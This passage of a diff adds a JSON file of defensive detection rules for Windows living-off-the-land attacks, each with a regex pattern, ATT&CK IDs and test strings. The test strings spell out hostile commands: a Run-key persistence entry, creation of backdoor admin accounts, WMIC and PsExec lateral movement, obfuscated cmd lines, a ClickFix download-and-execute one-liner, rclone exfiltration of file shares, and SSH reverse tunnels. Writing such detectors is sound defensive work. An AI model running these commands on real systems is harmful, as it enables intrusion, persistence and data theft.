+      "description": "A program was registered to start automatically at logon via a Run key.",
+      "recommendation": "Check the value that was added and whether the program is expected.",
+      "tests": {
+        "match": [
+          "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upd /t REG_SZ /d C:\\Users\\a\\AppData\\x.exe"
+        ],
+        "nomatch": [
+          "reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+        ]
+      }
+    },
+    {
+      "id": "LOTL-ACCOUNT-ADMIN-ADD",
+      "title": "Account added to the local Administrators group",
+      "images": [
+        "net.exe",
+        "net1.exe"
+      ],
+      "pattern": "(?i)localgroup\\s+(?:administrators|administrateurs|administradores|administratoren|\\\"?remote desktop users\\\"?)\\s+\\S+\\s+/add",
+      "technique": [
+        "T1098"
+      ],
+      "severity": "High",
+      "confidence": "Medium",
+      "description": "An account was given local administrator (or RDP) rights from the command line.",
+      "recommendation": "Confirm the change was authorized; remove the membership if not and review the account's activity.",
+      "tests": {
+        "match": [
+          "net localgroup administrators support$ /add",
+          "net1 localgroup \"Remote Desktop Users\" bob /add"
+        ],
+        "nomatch": [
+          "net localgroup administrators"
+        ]
+      }
+    },
+    {
+      "id": "LOTL-ACCOUNT-CREATE",
+      "title": "Local account created from the command line",
+      "images": [
+        "net.exe",
+        "net1.exe"
+      ],
+      "pattern": "(?i)\\buser\\s+\\S+\\s+\\S+\\s+/add\\b|\\buser\\s+\\S+\\s+/add\\b",
+      "technique": [
+        "T1136.001"
+      ],
+      "severity": "Medium",
+      "confidence": "Medium",
+      "description": "A new local account was created from the command line.",
+      "recommendation": "Verify the account is expected.",
+      "tests": {
+        "match": [
+          "net user helpdesk P@ssw0rd1 /add",
+          "net1 user backdoor /add"
+        ],
+        "nomatch": [
+          "net user",
+          "net user bob"
+        ]
+      }
+    },
+    {
+      "id": "LOTL-DISCOVERY-DOMAIN",
+      "title": "Domain / privileged-group reconnaissance",
+      "images": [
+        "nltest.exe",
+        "net.exe",
+        "net1.exe",
+        "dsquery.exe",
+        "adfind.exe"
+      ],
+      "pattern": "(?i)domain_trusts|/dclist|group\\s+\\\"?(?:domain admins|enterprise admins)\\\"?\\s+/domain|trustdmp|-f\\s+\\(?objectcategory",
+      "technique": [
+        "T1482",
+        "T1069"
+      ],
+      "severity": "Low",
+      "confidence": "Medium",
+      "description": "Commands that list domain trusts or privileged groups. Normal for admins, but a common early step in hands-on-keyboard intrusions.",
+      "recommendation": "Check who ran it and whether it clusters with other suspicious activity.",
+      "tests": {
+        "match": [
+          "nltest /domain_trusts /all_trusts",
+          "net group \"domain admins\" /domain",
+          "adfind.exe -f (objectcategory=computer)"
+        ],
+        "nomatch": [
+          "net group"
+        ]
+      }
+    },
+    {
+      "id": "LOTL-WMIC-REMOTE-EXEC",
+      "title": "WMIC remote or process-create execution",
+      "images": [
+        "wmic.exe"
+      ],
+      "pattern": "(?i)/node:[^\\n]+process\\s+call\\s+create|process\\s+call\\s+create",
+      "technique": [
+        "T1047"
+      ],
+      "severity": "Medium",
+      "confidence": "Medium",
+      "description": "WMIC created a process, possibly on another machine — used for lateral movement and execution.",
+      "recommendation": "Identify the target and the command executed.",
+      "tests": {
+        "match": [
+          "wmic /node:10.0.0.12 /user:admin process call create \"cmd /c whoami\"",
+          "wmic process call create calc.exe"
+        ],
+        "nomatch": [
+          "wmic process list brief"
+        ]
+      }
+    },
+    {
+      "id": "LOTL-PSEXEC",
+      "title": "PsExec-style remote service execution",
+      "images": [
+        "psexec.exe",
+        "psexec64.exe",
+        "paexec.exe",
+        "csexec.exe",
+        "remcom.exe"
+      ],
+      "pattern": "(?i)\\\\\\\\[\\w.\\-]+\\s|-s\\s|-accepteula",
+      "technique": [
+        "T1569.002",
+        "T1021.002"
+      ],
+      "severity": "Medium",
+      "confidence": "Medium",
+      "description": "PsExec or a clone ran a command remotely. Admins use it, but so do ransomware operators to push payloads across a network.",
+      "recommendation": "Confirm the operator and target were expected.",
+      "tests": {
+        "match": [
+          "psexec.exe \\\\10.0.0.5 -s cmd.exe",
+          "PsExec64.exe -accepteula -s -d \\\\fileserver c:\\windows\\temp\\x.exe"
+        ],
+        "nomatch": [
+          "psexec.exe"
+        ]
+      }
+    },
+    {
+      "id": "LOTL-CMD-OBFUSCATION",
+      "title": "Heavily obfuscated cmd.exe command",
+      "images": [
+        "cmd.exe"
+      ],
+      "pattern": "(?:\\^[^\\^\\s]){6,}|(?:%[A-Za-z_]+:~-?\\d+,-?\\d+%){3,}|set\\s+\\w+=[^&]*&&[^\\n]*set\\s+\\w+=[^&]*&&[^\\n]*call\\s+%",
+      "technique": [
+        "T1027.010",
+        "T1059.003"
+      ],
+      "severity": "High",
+      "confidence": "Medium",
+      "description": "The command line is deliberately obfuscated (caret insertion or substring tricks) to dodge detection.",
+      "recommendation": "Deobfuscate the command (remove carets, resolve the variables) and investigate what it runs.",
+      "tests": {
+        "match": [
+          "cmd /c p^o^w^e^r^s^h^e^l^l -c whoami",
+          "cmd /c %COMSPEC:~-7,1%%COMSPEC:~4,1%%COMSPEC:~-1,1%%COMSPEC:~3,1%"
+        ],
+        "nomatch": [
+          "cmd /c dir C:\\ ^| more"
+        ]
+      }
+    },
+    {
+      "id": "LOTL-CLICKFIX-CHAIN",
+      "title": "Pasted one-liner that downloads and runs (ClickFix / fake CAPTCHA)",
+      "images": [],
+      "pattern": "(?i)(?:powershell|pwsh|mshta|cmd)[^\\n]{0,30}[\\s\\S]{0,300}(?:https?://|\\\\\\\\[\\w.\\-]+@?\\d*\\\\)[\\s\\S]{0,300}(?:verify|captcha|human|robot|cloudflare|ray\\s*id|i\\s*am\\s*not)",
+      "technique": [
+        "T1204.004",
+        "T1059.001"
+      ],
+      "severity": "High",
+      "confidence": "Medium",
+      "description": "A command containing a download plus ‘verification’ wording, typical of fake CAPTCHA / ClickFix pages that trick users into pasting commands into the Run box.",
+      "recommendation": "Ask the user what website they were on, block it, and check what the command downloaded and ran.",
+      "tests": {
+        "match": [
+          "powershell -w h -c \"iwr https://check.example/v | iex\" # I am not a robot - Cloudflare Verification ID: 2291",
+          "mshta https://cdn.example/x # ✅ Verify you are human Ray ID: 88f2"
+        ],
+        "nomatch": [
+          "powershell -c Get-Date # verify"
+        ]
+      }
+    },
+    {
+      "id": "LOTL-RCLONE-EXFIL",
+      "title": "rclone copying data to cloud storage",
+      "images": [
+        "rclone.exe"
+      ],
+      "pattern": "(?i)\\b(?:copy|sync|move)\\b[^\\n]*\\s\\S+:",
+      "technique": [
+        "T1567.002"
+      ],
+      "severity": "High",
+      "confidence": "Medium",
+      "description": "rclone transferred files to a cloud remote. Ransomware gangs routinely use it to steal data before encrypting.",
+      "recommendation": "Identify the remote (rclone config file), the data copied, and block the destination.",
+      "tests": {
+        "match": [
+          "rclone.exe copy C:\\Shares\\Finance mega:backup --transfers 16",
+          "rclone sync \\\\fs01\\hr remote:dump"
+        ],
+        "nomatch": [
+          "rclone.exe version"
+        ]
+      }
+    },
+    {
+      "id": "LOTL-SSH-REVERSE-TUNNEL",
+      "title": "SSH/plink reverse tunnel",
+      "images": [
+        "ssh.exe",
+        "plink.exe"
+      ],
+      "pattern": "(?i)\\s-R\\s*\\d+:|\\s-D\\s*\\d+|\\s-R\\s+\\S+:\\d+",
+      "technique": [
+        "T1572"
+      ],
+      "severity": "High",
+      "confidence": "Medium",
+      "description": "An SSH reverse or dynamic tunnel was opened, which can expose internal services (like RDP) to an outside host.",
+      "recommendation": "Identify the remote host and close the tunnel if unauthorized.",
+      "tests": {
+        "match": [
+          "plink.exe -ssh -R 3389:127.0.0.1:3389 user@203.0.113.4",
+          "ssh -R 4444:localhost:3389 tunnel@x.example"
+        ],
+        "nomatch": [
+          "ssh admin@server01"
+        ]
+      }
+    }
+  ]
+}
